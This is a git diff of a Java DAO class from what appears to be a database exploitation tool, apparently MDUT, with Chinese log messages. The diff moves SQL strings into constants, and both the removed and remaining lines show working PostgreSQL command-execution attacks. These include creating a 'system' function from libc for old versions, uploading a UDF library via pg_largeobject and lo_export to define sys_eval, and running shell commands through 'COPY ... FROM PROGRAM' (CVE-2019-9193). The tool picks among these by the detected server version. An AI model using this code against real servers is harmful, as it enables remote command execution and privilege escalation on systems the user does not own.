@@ -3,6 +3,7 @@ package Dao;
 import Controller.PostgreSqlController;
 import Entity.ControllersFactory;
 import Util.MessageUtil;
+import Util.PostgreSqlUtil;
 import Util.Utils;
 import Util.YamlConfigs;
 
@@ -41,11 +42,6 @@ public class PostgreSqlDao {
      * 用此方法获取 PostgreSqlController 的日志框
      */
     private PostgreSqlController postgreSqlController = (PostgreSqlController) ControllersFactory.controllers.get(PostgreSqlController.class.getSimpleName());
-
-
-    public PostgreSqlDao() {
-
-    }
 
     public PostgreSqlDao(String ip, String port, String database, String username, String password, String timeout) throws Exception {
         // 从配置文件读取变量
@@ -102,13 +98,13 @@ public class PostgreSqlDao {
     public void createEval() {
         try {
             List<String> libFiles = Arrays.asList("/lib/x86_64-linux-gnu/libc.so.6", "/lib/libc.so.6", "/lib64/libc.so.6");
-
             for (String libFile : libFiles) {
                 try {
-                    String libSql = MessageFormat.format("CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS ''{0}'', ''system'' LANGUAGE ''c'' STRICT;", libFile);
+                    String libSql = MessageFormat.format(PostgreSqlUtil.libSql, libFile);
                     PreparedStatement st = CONN.prepareStatement(libSql);
                     st.executeQuery();
-                    postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log("版本<=8.2创建system函数成功,使用copy获取回显,无法回显请OOB"));
+                    postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log("版本 <=8.2 创建 system 函数成功," +
+                            "使用 copy 获取回显,无法回显请 OOB"));
                 } catch (Exception e) {
                     MessageUtil.showExceptionMessage(e, e.getMessage());
                 }
@@ -124,7 +120,7 @@ public class PostgreSqlDao {
          * 分片4096个16进制插入largeobject
          * */
         try {
-            String injectStr = "INSERT INTO pg_largeobject VALUES (%d, %d, decode('%s', 'hex'));";
+            String injectStr = PostgreSqlUtil.injectSql;
             List<String> udfSplit = Utils.getStrList(udfHex, 4096);
 
             for (int i = 0; i < udfSplit.size(); i++) {
@@ -146,7 +142,7 @@ public class PostgreSqlDao {
     public void udf() {
         try {
             int randomPIN = (int) (Math.random() * 9000) + 1000;
-            String sql = "SELECT lo_create(" + randomPIN + ");";
+            String sql = String.format(PostgreSqlUtil.locreateSql,randomPIN);
             PreparedStatement st = CONN.prepareStatement(sql);
             st.execute();
 
@@ -155,44 +151,45 @@ public class PostgreSqlDao {
 
             String tempFile = systemTempPath + randomPIN + ".temp";
 
-            String sqlExport = "SELECT lo_export(" + randomPIN + "," + "'" + tempFile + "');";
+            String sqlExport = String.format(PostgreSqlUtil.loexportSql,randomPIN, tempFile);
 
 
             PreparedStatement st1 = CONN.prepareStatement(sqlExport);
             st1.execute();
             Thread.sleep(1000);
 
-            String sqlFunc = "CREATE OR REPLACE FUNCTION sys_eval(text) RETURNS text AS '" + tempFile + "', 'sys_eval' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE;";
+            String sqlFunc = String.format(PostgreSqlUtil.createSql, tempFile);
             PreparedStatement st2 = CONN.prepareStatement(sqlFunc);
             st2.execute();
 
             Thread.sleep(500);
-            String sqlUnlink = "SELECT lo_unlink (" + randomPIN + ");";
+            String sqlUnlink = String.format(PostgreSqlUtil.lounlinkSql, randomPIN);
             PreparedStatement st3 = CONN.prepareStatement(sqlUnlink);
             st3.execute();
-            postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log("udf库写入成功,请尝试执行系统命令"));
+            postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log("UDF 库写入成功,请尝试执行系统命令"));
         } catch (Exception e) {
+            postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log("错误！" + e.getMessage()));
             MessageUtil.showExceptionMessage(e, e.getMessage());
         }
     }
 
     public String LowVersionEval(String command, String code) throws SQLException {
         try {
-            String sql = "CREATE TABLE sectest111(t TEXT);";
+            String sql = PostgreSqlUtil.createTempTableSql;
             PreparedStatement st = CONN.prepareStatement(sql);
             st.executeUpdate();
 
             String tempFile = systemTempPath + "postgre_system";
 
-            String sql1 = "select system('" + command + "> " + tempFile + "') as s;";
+            String sql1 = String.format(PostgreSqlUtil.redirectSql, command,tempFile);
             PreparedStatement st1 = CONN.prepareStatement(sql1);
             st1.executeQuery();
 
-            String tmpSql = "COPY sectest111 FROM '" + tempFile + "';";
+            String tmpSql = String.format(PostgreSqlUtil.copySql,tempFile);
             PreparedStatement st2 = CONN.prepareStatement(tmpSql);
             st2.executeUpdate();
 
-            String resultSql = "SELECT * FROM sectest111;";
+            String resultSql = PostgreSqlUtil.selectTempTableSql;
             PreparedStatement st3 = CONN.prepareStatement(resultSql);
             ResultSet rs2 = st3.executeQuery();
 
@@ -207,7 +204,7 @@ public class PostgreSqlDao {
         } catch (Exception e) {
             MessageUtil.showExceptionMessage(e, e.getMessage());
         } finally {
-            String tmp1Sql = "drop table sectest111;";
+            String tmp1Sql = PostgreSqlUtil.dropTempTableSql;
             PreparedStatement st4 = CONN.prepareStatement(tmp1Sql);
             st4.executeUpdate();
         }
@@ -216,7 +213,7 @@ public class PostgreSqlDao {
 
     public String udfEval(String command, String code) {
         try {
-            String resultSql = "select sys_eval('" + command + "');";
+            String resultSql = String.format(PostgreSqlUtil.evalSql,command);
             PreparedStatement st = CONN.prepareStatement(resultSql);
             ResultSet rs = st.executeQuery();
             while (rs.next()) {
@@ -235,19 +232,19 @@ public class PostgreSqlDao {
             // 单引号需要双写转义
             String repCommand = command.replace("'", "''");
 
-            String tmp1Sql = "DROP TABLE IF EXISTS cmd_exec;";
+            String tmp1Sql = PostgreSqlUtil.dropCmdtableSql;
             PreparedStatement st4 = CONN.prepareStatement(tmp1Sql);
             st4.executeUpdate();
 
-            String sql = "CREATE TABLE cmd_exec(cmd_output text);";
+            String sql = PostgreSqlUtil.createCmdtableSql;
             PreparedStatement st = CONN.prepareStatement(sql);
             st.executeUpdate();
 
-            String tmpSql = "COPY cmd_exec FROM PROGRAM '" + repCommand + "';";
+            String tmpSql = String.format(PostgreSqlUtil.runCmdSql, repCommand);
             PreparedStatement st2 = CONN.prepareStatement(tmpSql);
             st2.executeUpdate();
 
-            String resultSql = "SELECT * FROM cmd_exec;";
+            String resultSql = PostgreSqlUtil.selectCmdResSql;
             PreparedStatement st3 = CONN.prepareStatement(resultSql);
             ResultSet rs2 = st3.executeQuery();
 
@@ -285,7 +282,7 @@ public class PostgreSqlDao {
 
     public void clear() {
         try {
-            String sql = "drop function sys_eval(text);";
+            String sql = PostgreSqlUtil.dropEvalSql;
             PreparedStatement st = CONN.prepareStatement(sql);
             ResultSet rs = st.executeQuery();
 
@@ -300,7 +297,7 @@ public class PostgreSqlDao {
         try {
             List<String> wVersion = Arrays.asList("w64", "w32", "mingw", "visual studio", "Visual C++");
 
-            String sql = "SELECT version() as v;";
+            String sql = PostgreSqlUtil.versionInfoSql;
 
             PreparedStatement st = CONN.prepareStatement(sql);
 
@@ -311,7 +308,7 @@ public class PostgreSqlDao {
                 for (String str : wVersion) {
                     if (version.contains(str)) {
                         systemplatform = "windows";
-                        systemTempPath = "c:\\\\users\\\\public\\\\";
+                        systemTempPath = "c:\\users\\public\\";
                         break;
                     }
                 }
@@ -329,11 +326,11 @@ public class PostgreSqlDao {
 
 
                 postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log(String.format("预判服务器类型：%s 服务器版本: %s", systemplatform, systemVersionNum)));
-                postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log(String.format("postgre版本：%s", version)));
+                postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log(String.format("PostgreSql 版本：%s", version)));
             }
 
             // 获取具体版本
-            String sqlVersion = "SHOW server_version";
+            String sqlVersion = PostgreSqlUtil.serverVersionInfoSql;
             PreparedStatement st1 = CONN.prepareStatement(sqlVersion);
 
             ResultSet rs1 = st1.executeQuery();
@@ -358,35 +355,21 @@ public class PostgreSqlDao {
 
             if (versionNumber <= 8.2) {
                 evalType = "low";
-                postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log("版本小于8.2可直接创建system函数"));
+                postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log("版本小于 8.2 可直接创建 system 函数"));
             } else if (versionNumber > 8.2 && versionNumber < 9.3) {
                 evalType = "udf";
                 // 设置本地文件目录
                 String path = Utils.getSelfPath() + File.separator + "Plugins" + File.separator + "PostgreSql" + File.separator + versionNumber.toString() + "_" + systemplatform + "_" + systemVersionNum + "_hex.txt";
                 pluginFile = Utils.readFile(path).replace("\n", "");
-                postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log("版本可以尝试进行UDF提权"));
+                postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log("版本可以尝试进行 UDF 提权"));
             } else if (versionNumber >= 9.3) {
                 evalType = "cve";
-                postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log("9.3以上版本默认使用 CVE-2019-9193"));
+                postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log("9.3 以上版本默认使用 CVE-2019-9193"));
             } else {
                 postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log("该版本尚未编译UDF或无法提权"));
             }
-
         } catch (Exception e) {
             MessageUtil.showExceptionMessage(e, e.getMessage());
         }
-    }
-
-    public static void main(String[] args) {
-//        try {
-//            MysqlDao md = new MysqlDao("192.168.18.159","3306","mysql","root","root");
-//            System.out.println(testConnection());
-//            System.out.println("success");
-//        } catch (Exception e) {
-//            e.printStackTrace();
-//        }
-        PostgreSqlDao postgreSqlDao = new PostgreSqlDao();
-
-        postgreSqlDao.injectUdf(12359, Utils.readFile("/Users/wayne/code/java/tools/MDUT/MDAT-DEV/src/main/Plugins/PostgreSql/9.1_windows_32_hex.txt").replace("\n", ""));
     }
 }
